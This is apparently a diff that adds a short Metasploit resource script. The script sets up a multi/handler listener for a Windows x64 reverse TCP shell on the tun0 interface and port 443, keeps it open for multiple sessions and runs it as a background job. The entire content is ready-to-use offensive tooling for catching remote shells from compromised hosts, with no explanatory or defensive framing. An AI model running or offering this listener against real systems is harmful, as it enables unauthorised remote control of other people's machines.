@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD windows/x64/shell/reverse_tcp
+set LHOST tun0
+set LPORT 443
+set ExitOnSession false
+exploit -j
